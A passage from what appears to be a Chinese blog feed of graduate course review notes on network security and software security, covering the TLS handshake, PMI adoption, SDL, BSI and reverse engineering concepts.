title=&#34;一个大秘密K由两个秘密s和m组成，两个子秘密不可以暴露，分发给n个人如何分发。&#34;&gt;&lt;/a&gt;一个大秘密K由两个秘密s和m组成，两个子秘密不可以暴露，分发给n个人如何分发。&lt;/h2&gt;&lt;h2 id=&#34;不可以用ocsl和什么（记不清楚了），使用rsa门限算法，和秘密分享技术。设计一个服务器撤销证书之后，用户立刻&#34;&gt;&lt;a href=&#34;#不可以用ocsl和什么（记不清楚了），使用rsa门限算法，和秘密分享技术。设计一个服务器撤销证书之后，用户立刻&#34; class=&#34;headerlink&#34; title=&#34;不可以用ocsl和什么（记不清楚了），使用rsa门限算法，和秘密分享技术。设计一个服务器撤销证书之后，用户立刻&#34;&gt;&lt;/a&gt;不可以用ocsl和什么（记不清楚了），使用rsa门限算法，和秘密分享技术。设计一个服务器撤销证书之后，用户立刻&lt;/h2&gt;&lt;p&gt;不可以进行签名。描述其具体过程。&lt;/p&gt;
&lt;h1 id=&#34;其他&#34;&gt;&lt;a href=&#34;#其他&#34; class=&#34;headerlink&#34; title=&#34;其他&#34;&gt;&lt;/a&gt;其他&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;假设A和B均拥有由可信第三方C&lt;strong&gt;&lt;strong&gt;A&lt;/strong&gt;&lt;/strong&gt;签发的证书Cer&lt;strong&gt;&lt;strong&gt;A&lt;/strong&gt;&lt;/strong&gt;和Cer&lt;strong&gt;&lt;strong&gt;B&lt;/strong&gt;&lt;/strong&gt;，以及可信第三方C&lt;strong&gt;&lt;strong&gt;A&lt;/strong&gt;&lt;/strong&gt;的根证书。若A想要与B进行双向身份鉴别，并进行加密通信，请详细描述A、B完成上述需求所需的步骤，以R&lt;strong&gt;&lt;strong&gt;SA&lt;/strong&gt;&lt;/strong&gt;算法为例。&lt;/strong&gt;&lt;/p&gt;
&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106133209217.png&#34; alt=&#34;image-20230106133209217&#34; style=&#34;zoom:25%;&#34;&gt;

&lt;p&gt;1.A给B发送client hello,带有随机数、支持的协议版本、支持的算法列表&lt;/p&gt;
&lt;p&gt;2.B给A发送server hello,带有随机数,选定协议版本和算法(RSA)&lt;/p&gt;
&lt;p&gt;3.B给A发送B的证书,含有RSA公钥&lt;/p&gt;
&lt;p&gt;4.A通过CA根证书验证B的证书&lt;/p&gt;
&lt;p&gt;5.验证通过后A选定48字节随机数,用B的证书公钥加密后发给B&lt;/p&gt;
&lt;p&gt;6.A发送自己的证书给B&lt;/p&gt;
&lt;p&gt;7.B通过CA根证书验证A的证书&lt;/p&gt;
&lt;p&gt;8.双方计算通信需要的密钥等,开始加密通信&lt;/p&gt;
&lt;p&gt;9.A通知B启用协商好的算法&lt;/p&gt;
&lt;p&gt;10.A结束&lt;/p&gt;
&lt;p&gt;11.B通知A启用协商好的算法&lt;/p&gt;
&lt;p&gt;12.B结束&lt;/p&gt;
&lt;h2 id=&#34;请调研和分析目前PMI-Privilege-Management-Infrastructure-没有大规模使用的原因&#34;&gt;&lt;a href=&#34;#请调研和分析目前PMI-Privilege-Management-Infrastructure-没有大规模使用的原因&#34; class=&#34;headerlink&#34; title=&#34;请调研和分析目前PMI(Privilege Management Infrastructure)没有大规模使用的原因&#34;&gt;&lt;/a&gt;请调研和分析目前PMI(Privilege Management Infrastructure)没有大规模使用的原因&lt;/h2&gt;&lt;p&gt;PMI（Privilege Management Infrastructure）是一种用于管理计算机系统中用户权限的基础设施。它可以帮助组织控制哪些用户可以执行哪些操作，从而提高系统的安全性。但是，目前 PMI 还没有得到大规模使用的原因是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;实施较为复杂：PMI 需要在计算机系统中部署多个软件组件，这需要较高的技术水平和较长的时间。&lt;/li&gt;
&lt;li&gt;实施成本较高：实施 PMI 需要购买软件和硬件，以及训练员工，这会带来较高的成本。&lt;/li&gt;
&lt;li&gt;维护较为困难：PMI 的软件组件繁多，维护起来较为困难。&lt;/li&gt;
&lt;li&gt;缺乏普及性：PMI 目前并没有得到广泛的接受和使用，因此组织可能比较担心风险。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;总之，PMI 还没有得到大规模使用的原因是实施较为复杂、实施成本较高、维护较为困难和缺乏普及性等。&lt;/p&gt;
</content>
        <category term="研究生课程" />
        <updated>2022-12-30T11:18:28.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/</id>
        <title>ucas-软件安全原理-复习</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/"/>
        <content type="html">&lt;p&gt;根据*的数量标识重要程度,最高级 ***&lt;/p&gt;
&lt;h1 id=&#34;一、软件安全&#34;&gt;&lt;a href=&#34;#一、软件安全&#34; class=&#34;headerlink&#34; title=&#34;一、软件安全&#34;&gt;&lt;/a&gt;一、软件安全&lt;/h1&gt;&lt;h2 id=&#34;重新认识软件&#34;&gt;&lt;a href=&#34;#重新认识软件&#34; class=&#34;headerlink&#34; title=&#34;重新认识软件*&#34;&gt;&lt;/a&gt;重新认识软件*&lt;/h2&gt;&lt;p&gt;软件的重要性:软件是构建网络空间的“水泥”&lt;/p&gt;
&lt;p&gt;软件的最本质特性:可编程(programmable)&lt;/p&gt;
&lt;p&gt;软件是不负责任的产品           为什么??()&lt;/p&gt;
&lt;h2 id=&#34;软件和程序的定义&#34;&gt;&lt;a href=&#34;#软件和程序的定义&#34; class=&#34;headerlink&#34; title=&#34;软件和程序的定义&#34;&gt;&lt;/a&gt;软件和程序的定义&lt;/h2&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230102230652126.png&#34; alt=&#34;image-20230102230652126&#34; style=&#34;zoom:33%;&#34;&gt;

&lt;h3 id=&#34;软件&#34;&gt;&lt;a href=&#34;#软件&#34; class=&#34;headerlink&#34; title=&#34;软件&#34;&gt;&lt;/a&gt;软件&lt;/h3&gt;&lt;p&gt;是用户与硬件之间的接口,用户通过软件与计算机交流&lt;/p&gt;
&lt;p&gt;软件包括 程序、数据和文档&lt;/p&gt;
&lt;h3 id=&#34;程序&#34;&gt;&lt;a href=&#34;#程序&#34; class=&#34;headerlink&#34; title=&#34;程序&#34;&gt;&lt;/a&gt;程序&lt;/h3&gt;&lt;p&gt;是一组通过计算机执行,以完成特定任务的指令&lt;/p&gt;
&lt;p&gt;程序包括以下类型: 源程序、汇编代码、目标程序&lt;/p&gt;
&lt;h2 id=&#34;软件、网络空间安全发展历程&#34;&gt;&lt;a href=&#34;#软件、网络空间安全发展历程&#34; class=&#34;headerlink&#34; title=&#34;软件、网络空间安全发展历程&#34;&gt;&lt;/a&gt;软件、网络空间安全发展历程&lt;/h2&gt;&lt;p&gt;这是一条线,完整的发展过程,未来做研究等,也可以按照类似的方法&lt;/p&gt;
&lt;p&gt;编程语言、操作系统、专用软件的发展路线,反映了这些年软件技术交叠发展的态势&lt;/p&gt;
&lt;h2 id=&#34;什么是软件安全&#34;&gt;&lt;a href=&#34;#什么是软件安全&#34; class=&#34;headerlink&#34; title=&#34;什么是软件安全 ***&#34;&gt;&lt;/a&gt;什么是软件安全 ***&lt;/h2&gt;&lt;p&gt;软件安全是网络空间安全的重要部分. 主要研究软件的防御机制与技术,软件脆弱性分析与漏洞利用技术,网络系统环境中软件的攻防博弈,以及软件安全性的工程化保障方法.&lt;/p&gt;
&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221227142004483.png&#34; alt=&#34;image-20221227142004483&#34; style=&#34;zoom: 25%;&#34;&gt;

&lt;h2 id=&#34;白帽与黑帽&#34;&gt;&lt;a href=&#34;#白帽与黑帽&#34; class=&#34;headerlink&#34; title=&#34;白帽与黑帽 *&#34;&gt;&lt;/a&gt;白帽与黑帽 *&lt;/h2&gt;&lt;p&gt;黑帽子(破坏方法):与攻击、攻击程序和破解软件相关的方法&lt;/p&gt;
&lt;p&gt;白帽子(建设方法):与设计、防御和功能性相关的方法&lt;/p&gt;
&lt;h2 id=&#34;软件安全三部曲&#34;&gt;&lt;a href=&#34;#软件安全三部曲&#34; class=&#34;headerlink&#34; title=&#34;软件安全三部曲 ***&#34;&gt;&lt;/a&gt;软件安全三部曲 ***&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221228151447620.png&#34; alt=&#34;image-20221228151447620&#34;&gt;&lt;/p&gt;
&lt;p&gt;软件安全防御:从”白帽“的视角,研究软件的各类防御机制&lt;/p&gt;
&lt;p&gt;软件安全分析和利用:从”黑帽“的视角,研究软件存在的各种安全脆弱性问题以及高效发现及利用方法&lt;/p&gt;
&lt;p&gt;安全的软件开发:确保软件安全的工程化方法,BSI是其核心思想,需要贯彻始终&lt;/p&gt;
&lt;h2 id=&#34;主席网络安全观&#34;&gt;&lt;a href=&#34;#主席网络安全观&#34; class=&#34;headerlink&#34; title=&#34;主席网络安全观 **&#34;&gt;&lt;/a&gt;主席网络安全观 **&lt;/h2&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221228151647672.png&#34; alt=&#34;image-20221228151647672&#34; style=&#34;zoom:25%;&#34;&gt;

&lt;ul&gt;
&lt;li&gt;一、关于网络安全的定位&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;​	1.没有网络安全就没有国家安全&lt;/p&gt;
&lt;p&gt;​	2.网络安全为人民,网络安全靠人民&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;二、关于安全和发展的关系&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;​	1.网络安全和信息化是一体之两翼,驱动之双轮&lt;/p&gt;
&lt;p&gt;​	2.以安全保发展,以发展促安全&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;三、关于网络安全法治&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;​	1.互联网不是法外之地&lt;/p&gt;
&lt;p&gt;​	2.坚持依法治网、依法办网、依法上网&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;四、关于网络空间技术能力&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;​	1.大力发展核心技术,加强关键基础信息设施安全保障&lt;/p&gt;
&lt;p&gt;​	2.最关键最核心的技术要立足自主创新、自立自强&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;五、关于网络安全人才建设&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;​	1.网络空间的竞争,归根结底是人才的竞争&lt;/p&gt;
&lt;p&gt;​	2.形成人才培养,技术创新,产业发展的良性生态&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;六、关于互联网国际治理&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;​	1.尊重网络主权,维护和平安全,促进开放合作,构建良好秩序&lt;/p&gt;
&lt;p&gt;​	2.构建网络空间安全命运共同体&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230102233025872.png&#34; alt=&#34;image-20230102233025872&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;《网络信息安全的真相》&#34;&gt;&lt;a href=&#34;#《网络信息安全的真相》&#34; class=&#34;headerlink&#34; title=&#34;《网络信息安全的真相》**&#34;&gt;&lt;/a&gt;《网络信息安全的真相》**&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;木桶原理(国外更倾向于叫链条原理?): 安全防御系统的强度是由其最薄弱环节的强度决定的&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;PDR模型:安全防御是一个过程,包含防护-检测-响应等基本环节&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;没有银弹:没有一个实际系统是无懈可击的,没有一项安全技术可以包治百病&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;软件安全与网络安全的关系&#34;&gt;&lt;a href=&#34;#软件安全与网络安全的关系&#34; class=&#34;headerlink&#34; title=&#34;软件安全与网络安全的关系 **&#34;&gt;&lt;/a&gt;软件安全与网络安全的关系 **&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;网络空间各种各样部件的大多数功能都是通过软件实现的,因此软件漏洞将直接影响网络空间的安全&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;围绕软件漏洞,无论是攻击还是防御,实际上都是在网络层面展开对抗&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221228152029114.png&#34; alt=&#34;image-20221228152029114&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;软件安全研究视角&#34;&gt;&lt;a href=&#34;#软件安全研究视角&#34; class=&#34;headerlink&#34; title=&#34;软件安全研究视角&#34;&gt;&lt;/a&gt;软件安全研究视角&lt;/h2&gt;&lt;p&gt;源代码 汇编代码 机器码&lt;/p&gt;
&lt;p&gt;要贯穿于这几个层次来综合分析,才会更好!&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;理解程序是软件安全攻防的基本功&lt;/li&gt;
&lt;li&gt;掌握程序的生成与运行原理是理解程序的前提&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;二、逆向工程&#34;&gt;&lt;a href=&#34;#二、逆向工程&#34; class=&#34;headerlink&#34; title=&#34;二、逆向工程&#34;&gt;&lt;/a&gt;二、逆向工程&lt;/h1&gt;&lt;h2 id=&#34;基础概念-定义&#34;&gt;&lt;a href=&#34;#基础概念-定义&#34; class=&#34;headerlink&#34; title=&#34;基础概念 定义 *&#34;&gt;&lt;/a&gt;基础概念 定义 *&lt;/h2&gt;&lt;p&gt;逆向工程:通过观察系统及其行为,建立其结构蓝图,以弄清其运行规律的过程&lt;/p&gt;
&lt;p&gt;软件逆向工程: 针对软件的逆向工程&lt;/p&gt;
&lt;p&gt;目标软件&amp;#x2F;程序: 运用逆向工程进行分析的特定软件或程序&lt;/p&gt;
&lt;h2 id=&#34;程序编译过程&#34;&gt;&lt;a href=&#34;#程序编译过程&#34; class=&#34;headerlink&#34; title=&#34;程序编译过程&#34;&gt;&lt;/a&gt;程序编译过程&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230102233655971.png&#34; alt=&#34;image-20230102233655971&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221228152616035.png&#34; alt=&#34;image-20221228152616035&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;程序的运行过程&#34;&gt;&lt;a href=&#34;#程序的运行过程&#34; class=&#34;headerlink&#34; title=&#34;程序的运行过程 *&#34;&gt;&lt;/a&gt;程序的运行过程 *&lt;/h2&gt;&lt;p&gt;栈桢中存放的东西&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230102233924030.png&#34; alt=&#34;image-20230102233924030&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221228153645531.png&#34; alt=&#34;image-20221228153645531&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;三种逆向方法比较&#34;&gt;&lt;a href=&#34;#三种逆向方法比较&#34; class=&#34;headerlink&#34; title=&#34;三种逆向方法比较&#34;&gt;&lt;/a&gt;三种逆向方法比较&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230102234031543.png&#34; alt=&#34;image-20230102234031543&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;逆向工程的敌手&#34;&gt;&lt;a href=&#34;#逆向工程的敌手&#34; class=&#34;headerlink&#34; title=&#34;逆向工程的敌手&#34;&gt;&lt;/a&gt;逆向工程的敌手&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230102234134750.png&#34; alt=&#34;image-20230102234134750&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;围绕逆向分析的博弈对抗&#34;&gt;&lt;a href=&#34;#围绕逆向分析的博弈对抗&#34; class=&#34;headerlink&#34; title=&#34;围绕逆向分析的博弈对抗 *&#34;&gt;&lt;/a&gt;围绕逆向分析的博弈对抗 *&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221228154105548.png&#34; alt=&#34;image-20221228154105548&#34;&gt;&lt;/p&gt;
&lt;p&gt;具体的内容如下图&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221228154120777.png&#34; alt=&#34;image-20221228154120777&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221228154131608.png&#34; alt=&#34;image-20221228154131608&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221228154149766.png&#34; alt=&#34;image-20221228154149766&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221228154158942.png&#34; alt=&#34;image-20221228154158942&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;三、安全的软件开发-SDL&#34;&gt;&lt;a href=&#34;#三、安全的软件开发-SDL&#34; class=&#34;headerlink&#34; title=&#34;三、安全的软件开发(SDL) **&#34;&gt;&lt;/a&gt;三、安全的软件开发(SDL) **&lt;/h1&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221228154447041.png&#34; alt=&#34;image-20221228154447041&#34; style=&#34;zoom: 33%;&#34;&gt;

&lt;h2 id=&#34;软件安全问题的根源&#34;&gt;&lt;a href=&#34;#软件安全问题的根源&#34; class=&#34;headerlink&#34; title=&#34;软件安全问题的根源 *&#34;&gt;&lt;/a&gt;软件安全问题的根源 *&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221228154550056.png&#34; alt=&#34;image-20221228154550056&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;软件-安全-的三大问题-复杂性、互连性、可扩展性&#34;&gt;&lt;a href=&#34;#软件-安全-的三大问题-复杂性、互连性、可扩展性&#34; class=&#34;headerlink&#34; title=&#34;软件(安全)的三大问题:复杂性、互连性、可扩展性&#34;&gt;&lt;/a&gt;软件(安全)的三大问题:复杂性、互连性、可扩展性&lt;/h3&gt;&lt;p&gt;复杂性:软件的规模和复杂性无节制增长,影响因素还有代码集成的紧密程度,补丁等,编译连接后的代码库会变大&lt;/p&gt;
&lt;p&gt;互联性:互联网增加了攻击目标的数量,简化了实施攻击的方法,通过网络访问不需要人工干预,很容易启动,当前企业体系结构在互联环境下暴露出越来越多的安全隐患&lt;/p&gt;
&lt;p&gt;可扩展性:可以通过插件等方式提供附加功能,导致难以阻止通过插件引入漏洞&lt;/p&gt;
&lt;h3 id=&#34;软件开发的三大问题-复杂性、复用性、劣币效应&#34;&gt;&lt;a href=&#34;#软件开发的三大问题-复杂性、复用性、劣币效应&#34; class=&#34;headerlink&#34; title=&#34;软件开发的三大问题:复杂性、复用性、劣币效应&#34;&gt;&lt;/a&gt;软件开发的三大问题:复杂性、复用性、劣币效应&lt;/h3&gt;&lt;p&gt;为什么软件是不负责任的? 可以从软件开发的三大问题, 劣币效应这里回答&lt;/p&gt;
&lt;p&gt;因为众多开发商对安全仍然不够重视,更加重视的是产品的功能以及快速上线,抢占市场. 于是产生了劣币排斥良币的现象.&lt;/p&gt;
&lt;h2 id=&#34;内构安全-build-security-in-x2F-BSI&#34;&gt;&lt;a href=&#34;#内构安全-build-security-in-x2F-BSI&#34; class=&#34;headerlink&#34; title=&#34;内构安全(build security in &amp;#x2F;BSI) **&#34;&gt;&lt;/a&gt;内构安全(build security in &amp;#x2F;BSI) **&lt;/h2&gt;&lt;p&gt;​		内构安全是一种协同化努力,通过提供实践、工具、指南、规则、原则及其他资源,让软件开发者、架构师和安全参与人员可以借此在软件开发的每个阶段将安全构建到软件中去&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221228155350390.png&#34; alt=&#34;image-20221228155350390&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;软件安全三大支柱&#34;&gt;&lt;a href=&#34;#软件安全三大支柱&#34; class=&#34;headerlink&#34; title=&#34;软件安全三大支柱 **&#34;&gt;&lt;/a&gt;软件安全三大支柱 **&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221228155550112.png&#34; alt=&#34;image-20221228155550112&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;支柱一-风险管理&#34;&gt;&lt;a href=&#34;#支柱一-风险管理&#34; class=&#34;headerlink&#34; title=&#34;支柱一:风险管理 *&#34;&gt;&lt;/a&gt;支柱一:风险管理 *&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;在整个SDLC中,&lt;font color=&#34;red&#34;&gt;识别、评级、追踪&lt;/font&gt;风险是软件风险实践的关键&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;安全接触点是与特定类型的RMF结合的最佳实践. 一旦针对特定软件的安全最佳实践“锁定”了一组风险,就会得到适当的处理&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;没有百分百的安全.只有通过实施风险管理,并充分考虑那些受影响的关键商业信息,才能让软件安全走出“技术王国”,为商业带来价值&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;支柱二-安全接触点&#34;&gt;&lt;a href=&#34;#支柱二-安全接触点&#34; class=&#34;headerlink&#34; title=&#34;支柱二:安全接触点 **&#34;&gt;&lt;/a&gt;支柱二:安全接触点 **&lt;/h3&gt;&lt;p&gt;软件安全接触点: 在软件开发生命周期中保障软件安全的一组最佳实践&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;这些接触点从黑帽子(渗透和攻击)和白帽子(防御和保护)两个方面综合考察软件开发中可能出现的问题&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;结合了接触点的软件开发生命周期(SDLC)就成为SDL,可在每个阶段尽可能避免和消除漏洞,同时又保留了熟悉的工作方式&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;它是软件安全的三大支柱的核心&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;支柱三-安全知识&#34;&gt;&lt;a href=&#34;#支柱三-安全知识&#34; class=&#34;headerlink&#34; title=&#34;支柱三:安全知识 **&#34;&gt;&lt;/a&gt;支柱三:安全知识 **&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221228162902379.png&#34; alt=&#34;image-20221228162902379&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221228162920125.png&#34; alt=&#34;image-20221228162920125&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230103092133700.png&#34; alt=&#34;image-20230103092133700&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230103092224532.png&#34; alt=&#34;image-20230103092224532&#34;&gt;&lt;/p&gt;
&lt;p&gt;![image-20230103092233471](ucas-软件安全原理-复习&amp;#x2F;image-202301030922 33471.png)&lt;/p&gt;
&lt;h3 id=&#34;安全知识与接触点&#34;&gt;&lt;a href=&#34;#安全知识与接触点&#34; class=&#34;headerlink&#34; title=&#34;安全知识与接触点 **&#34;&gt;&lt;/a&gt;安全知识与接触点 **&lt;/h3&gt;&lt;p&gt;记住这张图,并会进行相关的判断,例如 渗透测试是用来针对需求和使用案例的吗? x&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221228163018072.png&#34; alt=&#34;image-20221228163018072&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;软件安全的缺点-缺陷和瑕疵&#34;&gt;&lt;a href=&#34;#软件安全的缺点-缺陷和瑕疵&#34; class=&#34;headerlink&#34; title=&#34;软件安全的缺点(缺陷和瑕疵) *&#34;&gt;&lt;/a&gt;软件安全的缺点(缺陷和瑕疵) *&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20221228155636901.png&#34; alt=&#34;image-20221228155636901&#34;&gt;&lt;/p&gt;
&lt;p&gt;缺点分为了缺陷和瑕疵,都可以导致漏洞&lt;/p&gt;
&lt;h2 id=&#34;华为、微软为什么要实施SDL&#34;&gt;&lt;a href=&#34;#华为、微软为什么要实施SDL&#34; class=&#34;headerlink&#34; title=&#34;华为、微软为什么要实施SDL&#34;&gt;&lt;/a&gt;华为、微软为什么要实施SDL&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230103093354333.png&#34; alt=&#34;image-20230103093354333&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230103093515077.png&#34; alt=&#34;image-20230103093515077&#34;&gt;&lt;/p&gt;
&lt;p&gt;针对安全接触点和软件工件,对应哪一部分?&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230103093651054.png&#34; alt=&#34;image-20230103093651054&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86-%E5%A4%8D%E4%B9%A0/image-20230103093808648.png&#34; alt=&#34;image-20230103093808648&#34;&gt;&lt;/p&gt;
